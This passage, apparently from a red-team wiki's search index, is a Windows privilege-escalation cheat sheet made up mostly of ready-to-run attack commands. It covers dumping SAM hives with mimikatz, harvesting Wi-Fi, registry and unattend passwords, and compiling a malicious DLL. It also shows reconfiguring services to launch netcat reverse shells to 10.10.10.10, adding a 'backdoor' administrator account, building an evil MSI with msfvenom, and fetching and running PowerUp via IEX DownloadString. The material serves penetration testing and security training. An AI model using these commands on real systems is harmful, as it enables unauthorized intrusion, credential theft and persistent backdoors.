table</p> <pre><code>route print\nGet-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex\n</code></pre> <p>List the ARP table</p> <pre><code>arp -A\nGet-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State\n</code></pre> <p>List all current connections</p> <pre><code>netstat -ano\n</code></pre> <p>List all network shares</p> <pre><code>net share\npowershell Find-DomainShare -ComputerDomain domain.local\n</code></pre> <p>SNMP Configuration</p> <pre><code>reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\SNMP /s\nGet-ChildItem -path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\SNMP -Recurse\n</code></pre>"},{"location":"redteam/escalation/windows-privilege-escalation/#antivirus-enumeration","title":"Antivirus Enumeration","text":"<p>Enumerate antivirus on a box with <code>WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntivirusProduct Get displayName</code></p>"},{"location":"redteam/escalation/windows-privilege-escalation/#default-writeable-folders","title":"Default Writeable Folders","text":"<pre><code>C:\\Windows\\System32\\Microsoft\\Crypto\\RSA\\MachineKeys\nC:\\Windows\\System32\\spool\\drivers\\color\nC:\\Windows\\System32\\spool\\printers\nC:\\Windows\\System32\\spool\\servers\nC:\\Windows\\tracing\nC:\\Windows\\Temp\nC:\\Users\\Public\nC:\\Windows\\Tasks\nC:\\Windows\\System32\\tasks\nC:\\Windows\\SysWOW64\\tasks\nC:\\Windows\\System32\\tasks_migrated\\microsoft\\windows\\pls\\system\nC:\\Windows\\SysWOW64\\tasks\\microsoft\\windows\\pls\\system\nC:\\Windows\\debug\\wia\nC:\\Windows\\registration\\crmlog\nC:\\Windows\\System32\\com\\dmp\nC:\\Windows\\SysWOW64\\com\\dmp\nC:\\Windows\\System32\\fxstmp\nC:\\Windows\\SysWOW64\\fxstmp\n</code></pre>"},{"location":"redteam/escalation/windows-privilege-escalation/#eop-looting-for-passwords","title":"EoP - Looting for passwords","text":""},{"location":"redteam/escalation/windows-privilege-escalation/#sam-and-system-files","title":"SAM and SYSTEM files","text":"<p>The Security Account Manager (SAM), often Security Accounts Manager, is a database file. The user passwords are stored in a hashed format in a registry hive either as a LM hash or as a NTLM hash. This file can be found in %SystemRoot%/system32/config/SAM and is mounted on HKLM/SAM.</p> <pre><code># Usually %SYSTEMROOT% = C:\\Windows\n%SYSTEMROOT%\\repair\\SAM\n%SYSTEMROOT%\\System32\\config\\RegBack\\SAM\n%SYSTEMROOT%\\System32\\config\\SAM\n%SYSTEMROOT%\\repair\\system\n%SYSTEMROOT%\\System32\\config\\SYSTEM\n%SYSTEMROOT%\\System32\\config\\RegBack\\system\n</code></pre> <p>Generate a hash file for John using <code>pwdump</code> or <code>samdump2</code>.</p> <pre><code>pwdump SYSTEM SAM &gt; /root/sam.txt\nsamdump2 SYSTEM SAM -o sam.txt\n</code></pre> <p>Either crack it with <code>john -format=NT /root/sam.txt</code>, hashcat or use Pass-The-Hash.</p>"},{"location":"redteam/escalation/windows-privilege-escalation/#hivenightmare","title":"HiveNightmare","text":"<p>CVE-2021\u201336934 allows you to retrieve all registry hives (SAM,SECURITY,SYSTEM) in Windows 10 and 11 as a non-administrator user</p> <p>Check for the vulnerability using <code>icacls</code></p> <pre><code>C:\\Windows\\System32&gt; icacls config\\SAM\nconfig\\SAM BUILTIN\\Administrators:(I)(F)\n           NT AUTHORITY\\SYSTEM:(I)(F)\n           BUILTIN\\Users:(I)(RX)    &lt;-- this is wrong - regular users should not have read access!\n</code></pre> <p>Then exploit the CVE by requesting the shadowcopies on the filesystem and reading the hives from it.</p> <pre><code>mimikatz&gt; token::whoami /full\n\n# List shadow copies available\nmimikatz&gt; misc::shadowcopies\n\n# Extract account from SAM databases\nmimikatz&gt; lsadump::sam /system:\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM /sam:\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM\n\n# Extract secrets from SECURITY\nmimikatz&gt; lsadump::secrets /system:\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM /security:\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SECURITY\n</code></pre>"},{"location":"redteam/escalation/windows-privilege-escalation/#laps-settings","title":"LAPS Settings","text":"<p>Extract <code>HKLM\\Software\\Policies\\Microsoft Services\\AdmPwd</code> from Windows Registry.</p> <ul> <li>LAPS Enabled: AdmPwdEnabled</li> <li>LAPS Admin Account Name: AdminAccountName</li> <li>LAPS Password Complexity: PasswordComplexity</li> <li>LAPS Password Length: PasswordLength</li> <li>LAPS Expiration Protection Enabled: PwdExpirationProtectionEnabled</li> </ul>"},{"location":"redteam/escalation/windows-privilege-escalation/#search-for-file-contents","title":"Search for file contents","text":"<pre><code>cd C:\\ &amp; findstr /SI /M \"password\" *.xml *.ini *.txt\nfindstr /si password *.xml *.ini *.txt *.config 2&gt;nul &gt;&gt; results.txt\nfindstr /spin \"password\" *.*\n</code></pre> <p>Also search in remote places such as SMB Shares and SharePoint:</p> <ul> <li>Search passwords in SharePoint: nheiniger/SnaffPoint (must be compiled first, for referencing issue see: https://github.com/nheiniger/SnaffPoint/pull/6)</li> </ul> <pre><code># First, retrieve a token\n## Method 1: using SnaffPoint binary\n$token = (.\\GetBearerToken.exe https://your.sharepoint.com)\n## Method 2: using AADInternals\nInstall-Module AADInternals -Scope CurrentUser\nImport-Module AADInternals\n$token = (Get-AADIntAccessToken -ClientId \"9bc3ab49-b65d-410a-85ad-de819febfddc\" -Tenant \"your.onmicrosoft.com\" -Resource \"https://your.sharepoint.com\")\n\n# Second, search on Sharepoint\n## Method 1: using search strings in ./presets dir\n.\\SnaffPoint.exe -u \"https://your.sharepoint.com\" -t $token\n## Method 2: using search string in command line\n### -l uses FQL search, see: https://learn.microsoft.com/en-us/sharepoint/dev/general-development/fast-query-language-fql-syntax-reference\n.\\SnaffPoint.exe -u \"https://your.sharepoint.com\" -t $token -l -q \"filename:.config\"\n</code></pre> <ul> <li>Search passwords in SMB Shares: SnaffCon/Snaffler</li> </ul>"},{"location":"redteam/escalation/windows-privilege-escalation/#search-for-a-file-with-a-certain-filename","title":"Search for a file with a certain filename","text":"<pre><code>dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*\nwhere /R C:\\ user.txt\nwhere /R C:\\ *.ini\n</code></pre>"},{"location":"redteam/escalation/windows-privilege-escalation/#search-the-registry-for-key-names-and-passwords","title":"Search the registry for key names and passwords","text":"<pre><code>REG QUERY HKLM /F \"password\" /t REG_SZ /S /K\nREG QUERY HKCU /F \"password\" /t REG_SZ /S /K\n\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\" # Windows Autologin\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\" 2&gt;nul | findstr \"DefaultUserName DefaultDomainName DefaultPassword\" \nreg query \"HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP\" # SNMP parameters\nreg query \"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\" # Putty clear text proxy credentials\nreg query \"HKCU\\Software\\ORL\\WinVNC3\\Password\" # VNC credentials\nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\\RealVNC\\WinVNC4 /v password\n\nreg query HKLM /f password /t REG_SZ /s\nreg query HKCU /f password /t REG_SZ /s\n</code></pre>"},{"location":"redteam/escalation/windows-privilege-escalation/#passwords-in-unattendxml","title":"Passwords in unattend.xml","text":"<p>Location of the unattend.xml files.</p> <pre><code>C:\\unattend.xml\nC:\\Windows\\Panther\\Unattend.xml\nC:\\Windows\\Panther\\Unattend\\Unattend.xml\nC:\\Windows\\system32\\sysprep.inf\nC:\\Windows\\system32\\sysprep\\sysprep.xml\n</code></pre> <p>Display the content of these files with <code>dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2&gt;nul</code>.</p> <p>Example content</p> <pre><code>&lt;component name=\"Microsoft-Windows-Shell-Setup\" publicKeyToken=\"31bf3856ad364e35\" language=\"neutral\" versionScope=\"nonSxS\" processorArchitecture=\"amd64\"&gt;\n    &lt;AutoLogon&gt;\n     &lt;Password&gt;U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==&lt;/Password&gt;\n     &lt;Enabled&gt;true&lt;/Enabled&gt;\n     &lt;Username&gt;Administrateur&lt;/Username&gt;\n    &lt;/AutoLogon&gt;\n\n    &lt;UserAccounts&gt;\n     &lt;LocalAccounts&gt;\n      &lt;LocalAccount wcm:action=\"add\"&gt;\n       &lt;Password&gt;*SENSITIVE*DATA*DELETED*&lt;/Password&gt;\n       &lt;Group&gt;administrators;users&lt;/Group&gt;\n       &lt;Name&gt;Administrateur&lt;/Name&gt;\n      &lt;/LocalAccount&gt;\n     &lt;/LocalAccounts&gt;\n    &lt;/UserAccounts&gt;\n</code></pre> <p>Unattend credentials are stored in base64 and can be decoded manually with base64.</p> <pre><code>$ echo \"U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo=\"  | base64 -d \nSecretSecurePassword1234*\n</code></pre> <p>The Metasploit module <code>post/windows/gather/enum_unattend</code> looks for these files.</p>"},{"location":"redteam/escalation/windows-privilege-escalation/#iis-web-config","title":"IIS Web config","text":"<pre><code>Get-Childitem \u2013Path C:\\inetpub\\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue\n</code></pre> <pre><code>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config\nC:\\inetpub\\wwwroot\\web.config\n</code></pre>"},{"location":"redteam/escalation/windows-privilege-escalation/#other-files","title":"Other files","text":"<pre><code>%SYSTEMDRIVE%\\pagefile.sys\n%WINDIR%\\debug\\NetSetup.log\n%WINDIR%\\repair\\sam\n%WINDIR%\\repair\\system\n%WINDIR%\\repair\\software, %WINDIR%\\repair\\security\n%WINDIR%\\iis6.log\n%WINDIR%\\system32\\config\\AppEvent.Evt\n%WINDIR%\\system32\\config\\SecEvent.Evt\n%WINDIR%\\system32\\config\\default.sav\n%WINDIR%\\system32\\config\\security.sav\n%WINDIR%\\system32\\config\\software.sav\n%WINDIR%\\system32\\config\\system.sav\n%WINDIR%\\system32\\CCM\\logs\\*.log\n%USERPROFILE%\\ntuser.dat\n%USERPROFILE%\\LocalS~1\\Tempor~1\\Content.IE5\\index.dat\n%WINDIR%\\System32\\drivers\\etc\\hosts\nC:\\ProgramData\\Configs\\*\nC:\\Program Files\\Windows PowerShell\\*\ndir c:*vnc.ini /s /b\ndir c:*ultravnc.ini /s /b\n</code></pre>"},{"location":"redteam/escalation/windows-privilege-escalation/#wifi-passwords","title":"Wifi passwords","text":"<p>Find AP SSID <pre><code>netsh wlan show profile\n</code></pre></p> <p>Get Cleartext Pass <pre><code>netsh wlan show profile &lt;SSID&gt; key=clear\n</code></pre></p> <p>Oneliner method to extract wifi passwords from all the access point.</p> <pre><code>cls &amp; echo. &amp; for /f \"tokens=4 delims=: \" %a in ('netsh wlan show profiles ^| find \"Profile \"') do @echo off &gt; nul &amp; (netsh wlan show profiles name=%a key=clear | findstr \"SSID Cipher Content\" | find /v \"Number\" &amp; echo.) &amp; @echo on\n</code></pre>"},{"location":"redteam/escalation/windows-privilege-escalation/#sticky-notes-passwords","title":"Sticky Notes passwords","text":"<p>The sticky notes app stores it's content in a sqlite db located at <code>C:\\Users\\&lt;user&gt;\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite</code></p>"},{"location":"redteam/escalation/windows-privilege-escalation/#passwords-stored-in-services","title":"Passwords stored in services","text":"<p>Saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using SessionGopher</p> <pre><code>https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1\nImport-Module path\\to\\SessionGopher.ps1;\nInvoke-SessionGopher -AllDomain -o\nInvoke-SessionGopher -AllDomain -u domain.com\\adm-arvanaghi -p s3cr3tP@ss\n</code></pre>"},{"location":"redteam/escalation/windows-privilege-escalation/#passwords-stored-in-key-manager","title":"Passwords stored in Key Manager","text":"<p> This software will display its output in a GUI</p> <pre><code>rundll32 keymgr,KRShowKeyMgr\n</code></pre>"},{"location":"redteam/escalation/windows-privilege-escalation/#powershell-history","title":"Powershell History","text":"<p>Disable Powershell history: <code>Set-PSReadlineOption -HistorySaveStyle SaveNothing</code>.</p> <pre><code>type %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt\ntype C:\\Users\\swissky\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt\ntype $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\ncat (Get-PSReadlineOption).HistorySavePath\ncat (Get-PSReadlineOption).HistorySavePath | sls passw\n</code></pre>"},{"location":"redteam/escalation/windows-privilege-escalation/#powershell-transcript","title":"Powershell Transcript","text":"<pre><code>C:\\Users\\&lt;USERNAME&gt;\\Documents\\PowerShell_transcript.&lt;HOSTNAME&gt;.&lt;RANDOM&gt;.&lt;TIMESTAMP&gt;.txt\nC:\\Transcripts\\&lt;DATE&gt;\\PowerShell_transcript.&lt;HOSTNAME&gt;.&lt;RANDOM&gt;.&lt;TIMESTAMP&gt;.txt\n</code></pre>"},{"location":"redteam/escalation/windows-privilege-escalation/#password-in-alternate-data-stream","title":"Password in Alternate Data Stream","text":"<pre><code>PS &gt; Get-Item -path flag.txt -Stream *\nPS &gt; Get-Content -path flag.txt -Stream Flag\n</code></pre>"},{"location":"redteam/escalation/windows-privilege-escalation/#eop-processes-enumeration-and-tasks","title":"EoP - Processes Enumeration and Tasks","text":"<ul> <li> <p>What processes are running?     <pre><code>tasklist /v\nnet start\nsc query\nGet-Service\nGet-Process\nGet-WmiObject -Query \"Select * from Win32_Process\" | where {$_.Name -notlike \"svchost*\"} | Select Name, Handle, @{Label=\"Owner\";Expression={$_.GetOwner().User}} | ft -AutoSize\n</code></pre></p> </li> <li> <p>Which processes are running as \"system\"     <pre><code>tasklist /v /fi \"username eq system\"\n</code></pre></p> </li> <li> <p>Do you have powershell magic?     <pre><code>REG QUERY \"HKLM\\SOFTWARE\\Microsoft\\PowerShell\\1\\PowerShellEngine\" /v PowerShellVersion\n</code></pre></p> </li> <li> <p>List installed programs     <pre><code>Get-ChildItem 'C:\\Program Files', 'C:\\Program Files (x86)' | ft Parent,Name,LastWriteTime\nGet-ChildItem -path Registry::HKEY_LOCAL_MACHINE\\SOFTWARE | ft Name\n</code></pre></p> </li> <li> <p>List services     <pre><code>net start\nwmic service list brief\ntasklist /SVC\n</code></pre></p> </li> <li> <p>Enumerate scheduled tasks     <pre><code>schtasks /query /fo LIST 2&gt;nul | findstr TaskName\nschtasks /query /fo LIST /v &gt; schtasks.txt; cat schtask.txt | grep \"SYSTEM\\|Task To Run\" | grep -B 1 SYSTEM\nGet-ScheduledTask | where {$_.TaskPath -notlike \"\\Microsoft*\"} | ft TaskName,TaskPath,State\n</code></pre></p> </li> <li> <p>Startup tasks     <pre><code>wmic startup get caption,command\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\R\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\ndir \"C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\"\ndir \"C:\\Documents and Settings\\%username%\\Start Menu\\Programs\\Startup\"\n</code></pre></p> </li> </ul>"},{"location":"redteam/escalation/windows-privilege-escalation/#eop-incorrect-permissions-in-services","title":"EoP - Incorrect permissions in services","text":"<p>A service running as Administrator/SYSTEM with incorrect file permissions might allow EoP. You can replace the binary, restart the service and get system.</p> <p>Often, services are pointing to writeable locations: - Orphaned installs, not installed anymore but still exist in startup - DLL Hijacking     <pre><code># find missing DLL \n- Find-PathDLLHijack PowerUp.ps1\n- Process Monitor : check for \"Name Not Found\"\n\n# compile a malicious dll\n- For x64 compile with: \"x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll\"\n- For x86 compile with: \"i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll\"\n\n# content of windows_dll.c\n#include &lt;windows.h&gt;\nBOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {\n    if (dwReason == DLL_PROCESS_ATTACH) {\n        system(\"cmd.exe /k whoami &gt; C:\\\\Windows\\\\Temp\\\\dll.txt\");\n        ExitProcess(0);\n    }\n    return TRUE;\n}\n</code></pre></p> <ul> <li>PATH directories with weak permissions     <pre><code>$ for /f \"tokens=2 delims='='\" %a in ('wmic service list full^|find /i \"pathname\"^|find /i /v \"system32\"') do @echo %a &gt;&gt; c:\\windows\\temp\\permissions.txt\n$ for /f eol^=^\"^ delims^=^\" %a in (c:\\windows\\temp\\permissions.txt) do cmd.exe /c icacls \"%a\"\n\n$ sc query state=all | findstr \"SERVICE_NAME:\" &gt;&gt; Servicenames.txt\nFOR /F %i in (Servicenames.txt) DO echo %i\ntype Servicenames.txt\nFOR /F \"tokens=2 delims= \" %i in (Servicenames.txt) DO @echo %i &gt;&gt; services.txt\nFOR /F %i in (services.txt) DO @sc qc %i | findstr \"BINARY_PATH_NAME\" &gt;&gt; path.txt\n</code></pre></li> </ul> <p>Alternatively you can use the Metasploit exploit : <code>exploit/windows/local/service_permissions</code></p> <p>Note to check file permissions you can use <code>cacls</code> and <code>icacls</code></p> <p>icacls (Windows Vista +)   cacls (Windows XP)</p> <p>You are looking for <code>BUILTIN\\Users:(F)</code>(Full access), <code>BUILTIN\\Users:(M)</code>(Modify access) or  <code>BUILTIN\\Users:(W)</code>(Write-only access) in the output.</p>"},{"location":"redteam/escalation/windows-privilege-escalation/#example-with-windows-10-cve-2019-1322-usosvc","title":"Example with Windows 10 - CVE-2019-1322 UsoSvc","text":"<p>Prerequisite: Service account</p> <pre><code>PS C:\\Windows\\system32&gt; sc.exe stop UsoSvc\nPS C:\\Windows\\system32&gt; sc.exe config usosvc binPath=\"C:\\Windows\\System32\\spool\\drivers\\color\\nc.exe 10.10.10.10 4444 -e cmd.exe\"\nPS C:\\Windows\\system32&gt; sc.exe config UsoSvc binpath= \"C:\\Users\\mssql-svc\\Desktop\\nc.exe 10.10.10.10 4444 -e cmd.exe\"\nPS C:\\Windows\\system32&gt; sc.exe config UsoSvc binpath= \"cmd /C C:\\Users\\nc.exe 10.10.10.10 4444 -e cmd.exe\"\nPS C:\\Windows\\system32&gt; sc.exe qc usosvc\n[SC] QueryServiceConfig SUCCESS\n\nSERVICE_NAME: usosvc\n        TYPE               : 20  WIN32_SHARE_PROCESS \n        START_TYPE         : 2   AUTO_START  (DELAYED)\n        ERROR_CONTROL      : 1   NORMAL\n        BINARY_PATH_NAME   : C:\\Users\\mssql-svc\\Desktop\\nc.exe 10.10.10.10 4444 -e cmd.exe\n        LOAD_ORDER_GROUP   : \n        TAG                : 0\n        DISPLAY_NAME       : Update Orchestrator Service\n        DEPENDENCIES       : rpcss\n        SERVICE_START_NAME : LocalSystem\n\nPS C:\\Windows\\system32&gt; sc.exe start UsoSvc\n</code></pre>"},{"location":"redteam/escalation/windows-privilege-escalation/#example-with-windows-xp-sp1-upnphost","title":"Example with Windows XP SP1 - upnphost","text":"<pre><code># NOTE: spaces are mandatory for this exploit to work !\nsc config upnphost binpath= \"C:\\Inetpub\\wwwroot\\nc.exe 10.11.0.73 4343 -e C:\\WINDOWS\\System32\\cmd.exe\"\nsc config upnphost obj= \".\\LocalSystem\" password= \"\"\nsc qc upnphost\nsc config upnphost depend= \"\"\nnet start upnphost\n</code></pre> <p>If it fails because of a missing dependency, try the following commands.</p> <pre><code>sc config SSDPSRV start=auto\nnet start SSDPSRV\nnet stop upnphost\nnet start upnphost\n\nsc config upnphost depend=\"\"\n</code></pre> <p>Using <code>accesschk</code> from Sysinternals or accesschk-XP.exe - github.com/phackt</p> <pre><code>$ accesschk.exe -uwcqv \"Authenticated Users\" * /accepteula\nRW SSDPSRV\n        SERVICE_ALL_ACCESS\nRW upnphost\n        SERVICE_ALL_ACCESS\n\n$ accesschk.exe -ucqv upnphost\nupnphost\n  RW NT AUTHORITY\\SYSTEM\n        SERVICE_ALL_ACCESS\n  RW BUILTIN\\Administrators\n        SERVICE_ALL_ACCESS\n  RW NT AUTHORITY\\Authenticated Users\n        SERVICE_ALL_ACCESS\n  RW BUILTIN\\Power Users\n        SERVICE_ALL_ACCESS\n\n$ sc config &lt;vuln-service&gt; binpath=\"net user backdoor backdoor123 /add\"\n$ sc config &lt;vuln-service&gt; binpath= \"C:\\nc.exe -nv 127.0.0.1 9988 -e C:\\WINDOWS\\System32\\cmd.exe\"\n$ sc stop &lt;vuln-service&gt;\n$ sc start &lt;vuln-service&gt;\n$ sc config &lt;vuln-service&gt; binpath=\"net localgroup Administrators backdoor /add\"\n$ sc stop &lt;vuln-service&gt;\n$ sc start &lt;vuln-service&gt;\n</code></pre>"},{"location":"redteam/escalation/windows-privilege-escalation/#eop-windows-subsystem-for-linux-wsl","title":"EoP - Windows Subsystem for Linux (WSL)","text":"<p>Technique borrowed from Warlockobama's tweet</p> <p>With root privileges Windows  Subsystem for Linux (WSL)  allows users to create a bind shell on any port (no elevation needed). Don't know the root password? No problem just set the default user to root W/ .exe --default-user root. Now start your bind shell or reverse. <pre><code>wsl whoami\n./ubuntun1604.exe config --default-user root\nwsl whoami\nwsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'\n</code></pre> <p>Binary <code>bash.exe</code> can also be found in <code>C:\\Windows\\WinSxS\\amd64_microsoft-windows-lxssbash_[...]\\bash.exe</code></p> <p>Alternatively you can explore the <code>WSL</code> filesystem in the folder <code>C:\\Users\\%USERNAME%\\AppData\\Local\\Packages\\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\\LocalState\\rootfs\\</code></p>"},{"location":"redteam/escalation/windows-privilege-escalation/#eop-unquoted-service-paths","title":"EoP - Unquoted Service Paths","text":"<p>The Microsoft Windows Unquoted Service Path Enumeration Vulnerability. All Windows services have a Path to its executable. If that path is unquoted and contains whitespace or other separators, then the service will attempt to access a resource in the parent path first.</p> <pre><code>wmic service get name,displayname,pathname,startmode |findstr /i \"Auto\" |findstr /i /v \"C:\\Windows\\\\\" |findstr /i /v \"\"\"\n\nwmic service get name,displayname,startmode,pathname | findstr /i /v \"C:\\Windows\\\\\" |findstr /i /v \"\"\"\n\ngwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq \"Auto\" -and $_.PathName -notlike \"C:\\Windows*\" -and $_.PathName -notlike '\"*'} | select PathName,DisplayName,Name\n</code></pre> <ul> <li>Metasploit exploit : <code>exploit/windows/local/trusted_service_path</code></li> <li>PowerUp exploit     <pre><code># find the vulnerable application\nC:\\&gt; powershell.exe -nop -exec bypass \"IEX (New-Object Net.WebClient).DownloadString('https://your-site.com/PowerUp.ps1'); Invoke-AllChecks\"\n\n...\n[*] Checking for unquoted service paths...\nServiceName   : BBSvc\nPath          : C:\\Program Files\\Microsoft\\Bing Bar\\7.1\\BBSvc.exe\nStartName     : LocalSystem\nAbuseFunction : Write-ServiceBinary -ServiceName 'BBSvc' -Path &lt;HijackPath&gt;\n...\n\n# automatic exploit\nInvoke-ServiceAbuse -Name [SERVICE_NAME] -Command \"..\\..\\Users\\Public\\nc.exe 10.10.10.10 4444 -e cmd.exe\"\n</code></pre></li> </ul>"},{"location":"redteam/escalation/windows-privilege-escalation/#example","title":"Example","text":"<p>For <code>C:\\Program Files\\something\\legit.exe</code>, Windows will try the following paths first: - <code>C:\\Program.exe</code> - <code>C:\\Program Files.exe</code></p>"},{"location":"redteam/escalation/windows-privilege-escalation/#eop-path-interception","title":"EoP - $PATH Interception","text":"<p>Requirements: - PATH contains a writeable folder with low privileges. - The writeable folder is before the folder that contains the legitimate binary.</p> <p>EXAMPLE: <pre><code># List contents of the PATH environment variable\n# EXAMPLE OUTPUT: C:\\Program Files\\nodejs\\;C:\\WINDOWS\\system32\n$env:Path\n\n# See permissions of the target folder\n# EXAMPLE OUTPUT: BUILTIN\\Users: GR,GW\nicacls.exe \"C:\\Program Files\\nodejs\\\"\n\n# Place our evil-file in that folder.\ncopy evil-file.exe \"C:\\Program Files\\nodejs\\cmd.exe\"\n</code></pre></p> <p>Because (in this example) \"C:\\Program Files\\nodejs\\\" is before \"C:\\WINDOWS\\system32\\\" on the PATH variable, the next time the user runs \"cmd.exe\", our evil version in the nodejs folder will run, instead of the legitimate one in the system32 folder. </p>"},{"location":"redteam/escalation/windows-privilege-escalation/#eop-named-pipes","title":"EoP - Named Pipes","text":"<ol> <li>Find named pipes: <code>[System.IO.Directory]::GetFiles(\"\\\\.\\pipe\\\")</code></li> <li>Check named pipes DACL: <code>pipesec.exe &lt;named_pipe&gt;</code></li> <li>Reverse engineering software</li> <li>Send data throught the named pipe : <code>program.exe &gt;\\\\.\\pipe\\StdOutPipe 2&gt;\\\\.\\pipe\\StdErrPipe</code></li> </ol>"},{"location":"redteam/escalation/windows-privilege-escalation/#eop-kernel-exploitation","title":"EoP - Kernel Exploitation","text":"<p>List of exploits kernel : https://github.com/SecWiki/windows-kernel-exploits</p>"},{"location":"redteam/escalation/windows-privilege-escalation/#security-bulletinkb-descriptionoperating-system","title":"#Security Bulletin\u00a0\u00a0\u00a0#KB \u00a0\u00a0\u00a0\u00a0#Description\u00a0\u00a0\u00a0\u00a0#Operating System","text":"<ul> <li>MS17-017 \u3000[KB4013081]\u3000\u3000[GDI Palette Objects Local Privilege Escalation]\u3000\u3000(windows 7/8)</li> <li>CVE-2017-8464 \u3000[LNK Remote Code Execution Vulnerability]\u3000\u3000(windows 10/8.1/7/2016/2010/2008)</li> <li>CVE-2017-0213 \u3000[Windows COM Elevation of Privilege Vulnerability]\u3000\u3000(windows 10/8.1/7/2016/2010/2008)</li> <li>CVE-2018-0833   [SMBv3 Null Pointer Dereference Denial of Service]    (Windows 8.1/Server 2012 R2)</li> <li>CVE-2018-8120   [Win32k Elevation of Privilege Vulnerability]    (Windows 7 SP1/2008 SP2,2008 R2 SP1)</li> <li>MS17-010 \u3000[KB4013389]\u3000\u3000[Windows Kernel Mode Drivers]\u3000\u3000(windows 7/2008/2003/XP)</li> <li>MS16-135 \u3000[KB3199135]\u3000\u3000[Windows Kernel Mode Drivers]\u3000\u3000(2016)</li> <li>MS16-111 \u3000[KB3186973]\u3000\u3000[kernel api]\u3000\u3000(Windows 10 10586 (32/64)/8.1)</li> <li>MS16-098 \u3000[KB3178466]\u3000\u3000[Kernel Driver]\u3000\u3000(Win 8.1)</li> <li>MS16-075 \u3000[KB3164038]\u3000\u3000[Hot Potato]\u3000\u3000(2003/2008/7/8/2012)</li> <li>MS16-034 \u3000[KB3143145]\u3000\u3000[Kernel Driver]\u3000\u3000(2008/7/8/10/2012)</li> <li>MS16-032 \u3000[KB3143141]\u3000\u3000[Secondary Logon Handle]\u3000\u3000(2008/7/8/10/2012)</li> <li>MS16-016 \u3000[KB3136041]\u3000\u3000[WebDAV]\u3000\u3000(2008/Vista/7)</li> <li>MS16-014 \u3000[K3134228]\u3000\u3000[remote code execution]\u3000\u3000(2008/Vista/7)   ...</li> <li>MS03-026 \u3000[KB823980]\u3000\u3000 [Buffer Overrun In RPC Interface]\u3000\u3000(/NT/2000/XP/2003)  </li> </ul> <p>To cross compile a program from Kali, use the following command.</p> <pre><code>Kali&gt; i586-mingw32msvc-gcc -o adduser.exe useradd.c\n</code></pre>"},{"location":"redteam/escalation/windows-privilege-escalation/#eop-microsoft-windows-installer","title":"EoP - Microsoft Windows Installer","text":""},{"location":"redteam/escalation/windows-privilege-escalation/#alwaysinstallelevated","title":"AlwaysInstallElevated","text":"<p>Using the <code>reg query</code> command, you can check the status of the <code>AlwaysInstallElevated</code> registry key for both the user and the machine. If both queries return a value of <code>0x1</code>, then <code>AlwaysInstallElevated</code> is enabled for both user and machine, indicating the system is vulnerable.</p> <ul> <li>Shell command     <pre><code>reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n</code></pre></li> <li>PowerShell command     <pre><code>Get-ItemProperty HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer\nGet-ItemProperty HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer\n</code></pre></li> </ul> <p>Then create an MSI package and install it.</p> <pre><code>$ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi\n$ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi-nouac -o evil.msi\n$ msiexec /quiet /qn /i C:\\evil.msi\n</code></pre> <p>Technique also available in : * Metasploit : <code>exploit/windows/local/always_install_elevated</code> * PowerUp.ps1 : <code>Get-RegistryAlwaysInstallElevated</code>, <code>Write-UserAddMSI</code></p>"},{"location":"redteam/escalation/windows-privilege-escalation/#customactions","title":"CustomActions","text":"<p>Custom Actions in MSI allow developers to specify scripts or executables to be run at various points during an installation</p> <ul> <li>mgeeky/msidump - a tool that analyzes malicious MSI installation packages, extracts files, streams, binary data and incorporates YARA scanner.</li> <li>activescott/lessmsi - A tool to view and extract the contents of an Windows Installer (.msi) file.</li> <li>mandiant/msi-search - This tool simplifies the task for red team operators and security teams to identify which MSI files correspond to which software and enables them to download the relevant file.</li> </ul> 